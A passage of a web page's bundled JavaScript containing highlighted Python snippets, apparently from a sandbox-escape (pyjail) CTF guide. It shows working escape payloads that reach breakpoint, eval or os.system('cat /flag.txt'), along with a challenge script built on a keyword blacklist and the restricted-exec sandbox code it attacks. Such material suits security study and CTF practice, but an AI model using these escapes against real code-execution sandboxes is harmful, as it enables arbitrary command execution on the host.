l <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>y <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span>bu<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># ("breakpoint") - retrieve "breakpoint"</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">;</span> brs <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span>l<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># breakpoint</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span>
br <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span>bu<span class="token punctuation">)</span><span class="token punctuation">,</span> brs<span class="token punctuation">)</span> <span class="token comment"># &lt;built-in function breakpoint></span>
br<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># exec</span>
<span class="token comment"># match</span>
<span class="token keyword">match</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">case</span> <span class="token builtin">object</span><span class="token punctuation">(</span>_\uFF3Fdoc\uFF3F_<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
      <span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment"># ().__doc__</span>

<span class="token comment"># overwrite builtins</span>
__builtins__ <span class="token operator">=</span> sys
__builtins__ <span class="token operator">=</span> modules
__builtins__ <span class="token operator">=</span> os
system<span class="token punctuation">(</span><span class="token string">"cat /flag.txt"</span><span class="token punctuation">)</span></code>`,Co,pn,ka,Mc,Ao,on,Sd=`<code class="language-py"><span class="token comment"># exec</span>
<span class="token comment"># try...except</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
  <span class="token string">"&#123;0.__doc__.lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># format string by itself can also be used to leak values</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
  a <span class="token operator">=</span> e<span class="token punctuation">.</span>obj
  <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment"># ().__doc__</span></code>`,To,en,ra,qc,Fo,cn,zd=`<code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
obj <span class="token operator">=</span> cobj<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Do,ln,Yd=`<code class="language-py"><span class="token comment"># list comprehension</span>
<span class="token punctuation">[</span><span class="token operator">+</span>obj <span class="token keyword">for</span> obj<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__pos__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>obj<span class="token punctuation">[</span><span class="token string">"print(123)"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">eval</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></code>`,Io,un,_a,Nc,Ho,kn,Wd=`<code class="language-py"><span class="token comment"># exec</span>
<span class="token comment"># try...except</span>
delete_me <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    p
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> delete_me<span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>delete_me<span class="token punctuation">)</span> <span class="token comment"># error</span>

<span class="token comment"># del</span>
delete_me <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">del</span> delete_me
<span class="token keyword">print</span><span class="token punctuation">(</span>delete_me<span class="token punctuation">)</span> <span class="token comment"># error</span></code>`,Oo,rn,da,Sc,Ro,_n,fa,zc,jo,L,Za,C,Yc,Wc,m,Ja,Vc,Gc,Qa,$c,Xc,nt,Kc,Zc,st,Jc,Qc,at,nl,Uo,dn,ba,sl,Po,fn,tt,A,al,Bo,bn,ya,tl,Mo,yn,Vd=`<code class="language-py"><span class="token comment"># @salvatore-abello - type.__subclasses__(type)[0] -> &lt;class 'abc.ABCMeta'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"breakpoint"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,qo,mn,ma,pl,No,T,pt,F,ol,el,ot,D,cl,So,vn,va,ll,zo,f,j,et,ul,il,ct,kl,rl,_l,wa,lt,dl,fl,bl,ga,ut,yl,U,it,kt,ml,vl,rt,_t,wl,gl,Ea,dt,El,g,ft,bt,hl,xl,yt,mt,Ll,Cl,vt,wt,Al,Tl,ha,gt,Fl,E,Et,ht,Dl,Il,xt,Lt,Hl,Ol,Ct,At,Rl,jl,xa,Tt,Ul,La,Ft,Dt,Pl,Bl,Ca,It,Ml,P,Ht,Ot,ql,Nl,Rt,jt,Sl,zl,wn,Ut,Yl,Wl,B,Aa,Pt,Vl,Ta,Bt,Mt,Gl,$l,qt,Nt,Xl,Yo,gn,Fa,Kl,Wo,En,Da,Zl,Vo,hn,St,zt,Jl,Go,xn,Gd=`<code class="language-py"><span class="token comment">#!/usr/local/bin/python</span>
<span class="token keyword">from</span> exec_utils <span class="token keyword">import</span> safe_exec
<span class="token keyword">def</span> <span class="token function">my_safe_exec</span><span class="token punctuation">(</span>__source<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># even MORE safe, surely nothing you can do now!!!</span>
    <span class="token keyword">assert</span> __source<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ascii check failed"</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"match"</span><span class="token punctuation">,</span> <span class="token string">"case"</span><span class="token punctuation">,</span> <span class="token string">"async"</span><span class="token punctuation">,</span> <span class="token string">"def"</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"frame"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"byte"</span><span class="token punctuation">,</span> <span class="token string">"coding"</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
        <span class="token keyword">assert</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> __source<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string"> is banned"</span></span>
    <span class="token keyword">return</span> safe_exec<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    __source <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter code: "</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>inp<span class="token operator">:=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"#EOF"</span><span class="token punctuation">:</span>
            __source <span class="token operator">+=</span> inp <span class="token operator">+</span> <span class="token string">"&#92;n"</span>
    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        my_safe_exec<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">except</span> AssertionError <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span></code>`,$o,Ln,Yt,Wt,Ql,Xo,Cn,$d=`<code class="language-py"><span class="token comment"># code from https://github.com/run-llama/llama_index/blob/35afb6b93476ef4f4d61a48d847cd0b191ac5cb6/llama-index-experimental/llama_index/experimental/exec_utils.py</span>
<span class="token comment"># was main at the time of writing chall, however commit provided incase of changes</span>
<span class="token keyword">import</span> ast
<span class="token keyword">import</span> copy
<span class="token keyword">from</span> types <span class="token keyword">import</span> CodeType<span class="token punctuation">,</span> ModuleType
<span class="token keyword">from</span> typing <span class="token keyword">import</span> Any<span class="token punctuation">,</span> Dict<span class="token punctuation">,</span> Mapping<span class="token punctuation">,</span> Sequence<span class="token punctuation">,</span> Union

ALLOWED_IMPORTS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"math"</span><span class="token punctuation">,</span>
    <span class="token string">"time"</span><span class="token punctuation">,</span>
    <span class="token string">"datetime"</span><span class="token punctuation">,</span>
    <span class="token string">"pandas"</span><span class="token punctuation">,</span>
    <span class="token string">"scipy"</span><span class="token punctuation">,</span>
    <span class="token string">"numpy"</span><span class="token punctuation">,</span>
    <span class="token string">"matplotlib"</span><span class="token punctuation">,</span>
    <span class="token string">"plotly"</span><span class="token punctuation">,</span>
    <span class="token string">"seaborn"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">_restricted_import</span><span class="token punctuation">(</span>
    name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    <span class="token builtin">globals</span><span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    <span class="token builtin">locals</span><span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    fromlist<span class="token punctuation">:</span> Sequence<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    level<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ModuleType<span class="token punctuation">:</span>
    <span class="token keyword">if</span> name <span class="token keyword">in</span> ALLOWED_IMPORTS<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">globals</span><span class="token punctuation">,</span> <span class="token builtin">locals</span><span class="token punctuation">,</span> fromlist<span class="token punctuation">,</span> level<span class="token punctuation">)</span>
    <span class="token keyword">raise</span> ImportError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Import of module '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">' is not allowed"</span></span><span class="token punctuation">)</span>

ALLOWED_BUILTINS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"abs"</span><span class="token punctuation">:</span> <span class="token builtin">abs</span><span class="token punctuation">,</span>
    <span class="token string">"all"</span><span class="token punctuation">:</span> <span class="token builtin">all</span><span class="token punctuation">,</span>
    <span class="token string">"any"</span><span class="token punctuation">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span>
    <span class="token string">"ascii"</span><span class="token punctuation">:</span> <span class="token builtin">ascii</span><span class="token punctuation">,</span>
    <span class="token string">"bin"</span><span class="token punctuation">:</span> <span class="token builtin">bin</span><span class="token punctuation">,</span>
    <span class="token string">"bool"</span><span class="token punctuation">:</span> <span class="token builtin">bool</span><span class="token punctuation">,</span>
    <span class="token string">"bytearray"</span><span class="token punctuation">:</span> <span class="token builtin">bytearray</span><span class="token punctuation">,</span>
    <span class="token string">"bytes"</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span>
    <span class="token string">"chr"</span><span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">,</span>
    <span class="token string">"complex"</span><span class="token punctuation">:</span> <span class="token builtin">complex</span><span class="token punctuation">,</span>
    <span class="token string">"divmod"</span><span class="token punctuation">:</span> <span class="token builtin">divmod</span><span class="token punctuation">,</span>
    <span class="token string">"enumerate"</span><span class="token punctuation">:</span> <span class="token builtin">enumerate</span><span class="token punctuation">,</span>
    <span class="token string">"filter"</span><span class="token punctuation">:</span> <span class="token builtin">filter</span><span class="token punctuation">,</span>
    <span class="token string">"float"</span><span class="token punctuation">:</span> <span class="token builtin">float</span><span class="token punctuation">,</span>
    <span class="token string">"format"</span><span class="token punctuation">:</span> <span class="token builtin">format</span><span class="token punctuation">,</span>
    <span class="token string">"frozenset"</span><span class="token punctuation">:</span> <span class="token builtin">frozenset</span><span class="token punctuation">,</span>
    <span class="token string">"hash"</span><span class="token punctuation">:</span> <span class="token builtin">hash</span><span class="token punctuation">,</span>
    <span class="token string">"hex"</span><span class="token punctuation">:</span> <span class="token builtin">hex</span><span class="token punctuation">,</span>
    <span class="token string">"int"</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    <span class="token string">"isinstance"</span><span class="token punctuation">:</span> <span class="token builtin">isinstance</span><span class="token punctuation">,</span>
    <span class="token string">"issubclass"</span><span class="token punctuation">:</span> <span class="token builtin">issubclass</span><span class="token punctuation">,</span>
    <span class="token string">"len"</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">,</span>
    <span class="token string">"list"</span><span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span>
    <span class="token string">"map"</span><span class="token punctuation">:</span> <span class="token builtin">map</span><span class="token punctuation">,</span>
    <span class="token string">"max"</span><span class="token punctuation">:</span> <span class="token builtin">max</span><span class="token punctuation">,</span>
    <span class="token string">"min"</span><span class="token punctuation">:</span> <span class="token builtin">min</span><span class="token punctuation">,</span>
    <span class="token string">"oct"</span><span class="token punctuation">:</span> <span class="token builtin">oct</span><span class="token punctuation">,</span>
    <span class="token string">"ord"</span><span class="token punctuation">:</span> <span class="token builtin">ord</span><span class="token punctuation">,</span>
    <span class="token string">"pow"</span><span class="token punctuation">:</span> <span class="token builtin">pow</span><span class="token punctuation">,</span>
    <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">,</span>
    <span class="token string">"range"</span><span class="token punctuation">:</span> <span class="token builtin">range</span><span class="token punctuation">,</span>
    <span class="token string">"repr"</span><span class="token punctuation">:</span> <span class="token builtin">repr</span><span class="token punctuation">,</span>
    <span class="token string">"reversed"</span><span class="token punctuation">:</span> <span class="token builtin">reversed</span><span class="token punctuation">,</span>
    <span class="token string">"round"</span><span class="token punctuation">:</span> <span class="token builtin">round</span><span class="token punctuation">,</span>
    <span class="token string">"set"</span><span class="token punctuation">:</span> <span class="token builtin">set</span><span class="token punctuation">,</span>
    <span class="token string">"slice"</span><span class="token punctuation">:</span> <span class="token builtin">slice</span><span class="token punctuation">,</span>
    <span class="token string">"sorted"</span><span class="token punctuation">:</span> <span class="token builtin">sorted</span><span class="token punctuation">,</span>
    <span class="token string">"str"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    <span class="token string">"sum"</span><span class="token punctuation">:</span> <span class="token builtin">sum</span><span class="token punctuation">,</span>
    <span class="token string">"tuple"</span><span class="token punctuation">:</span> <span class="token builtin">tuple</span><span class="token punctuation">,</span>
    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token builtin">type</span><span class="token punctuation">,</span>
    <span class="token string">"zip"</span><span class="token punctuation">:</span> <span class="token builtin">zip</span><span class="token punctuation">,</span>
    <span class="token comment"># Constants</span>
    <span class="token string">"True"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token string">"False"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
    <span class="token string">"None"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    <span class="token string">"__import__"</span><span class="token punctuation">:</span> _restricted_import<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">_get_restricted_globals</span><span class="token punctuation">(</span>__globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">dict</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Any<span class="token punctuation">:</span>
    restricted_globals <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>ALLOWED_BUILTINS<span class="token punctuation">)</span>
    <span class="token keyword">if</span> __globals<span class="token punctuation">:</span>
        restricted_globals<span class="token punctuation">.</span>update<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span>
    <span class="token keyword">return</span> restricted_globals

vulnerable_code_snippets <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"os."</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

<span class="token keyword">class</span> <span class="token class-name">DunderVisitor</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>NodeVisitor<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">False</span>
        self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">False</span>

        builtins <span class="token operator">=</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>_builtins <span class="token operator">=</span> builtins

    <span class="token keyword">def</span> <span class="token function">visit_Name</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token keyword">not</span> <span class="token keyword">in</span> ALLOWED_BUILTINS <span class="token keyword">and</span> node<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>_builtins<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">visit_Attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Attribute<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span>attr <span class="token keyword">not</span> <span class="token keyword">in</span> ALLOWED_BUILTINS <span class="token keyword">and</span> node<span class="token punctuation">.</span>attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>_builtins<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_contains_protected_access</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    <span class="token comment"># do not allow imports</span>
    imports_modules <span class="token operator">=</span> <span class="token boolean">False</span>
    tree <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
    <span class="token keyword">for</span> node <span class="token keyword">in</span> ast<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> ast<span class="token punctuation">.</span>Import<span class="token punctuation">)</span><span class="token punctuation">:</span>
            imports_modules <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> ast<span class="token punctuation">.</span>ImportFrom<span class="token punctuation">)</span><span class="token punctuation">:</span>
            imports_modules <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>

    dunder_visitor <span class="token operator">=</span> DunderVisitor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    dunder_visitor<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>tree<span class="token punctuation">)</span>

    <span class="token keyword">for</span> vulnerable_code_snippet <span class="token keyword">in</span> vulnerable_code_snippets<span class="token punctuation">:</span>
        <span class="token keyword">if</span> vulnerable_code_snippet <span class="token keyword">in</span> code<span class="token punctuation">:</span>
            dunder_visitor<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        dunder_visitor<span class="token punctuation">.</span>has_access_to_private_entity
        <span class="token keyword">or</span> dunder_visitor<span class="token punctuation">.</span>has_access_to_disallowed_builtin
        <span class="token keyword">or</span> imports_modules
    <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_verify_source_safety</span><span class="token punctuation">(</span>__source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Verify that the source is safe to execute. For now, this means that it
    does not contain any references to private or dunder methods.
    """</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> CodeType<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Direct execution of CodeType is forbidden!"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        __source <span class="token operator">=</span> __source<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> _contains_protected_access<span class="token punctuation">(</span>__source<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>
            <span class="token string">"Execution of code containing references to private or dunder methods, "</span>
            <span class="token string">"disallowed builtins, or any imports, is forbidden!"</span>
        <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>
    __source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">,</span>
    __globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    __locals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Any<span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    eval within safe global context.
    """</span>
    _verify_source_safety<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> _get_restricted_globals<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span><span class="token punctuation">,</span> __locals<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_exec</span><span class="token punctuation">(</span>
    __source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">,</span>
    __globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    __locals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    eval within safe global context.
    """</span>
    _verify_source_safety<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token keyword">exec</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> _get_restricted_globals<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span><span class="token punctuation">,</span> __locals<span class="token punctuation">)</span></code>`,Ko,An,Vt,Gt,nu,Zo,Tn,Xd=`<code class="language-py"><span class="token comment"># Using "with"-statement context managers to expose/retrieve Exception classes</span>
<span class="token comment"># https://rszalski.github.io/magicmethods/#context</span>
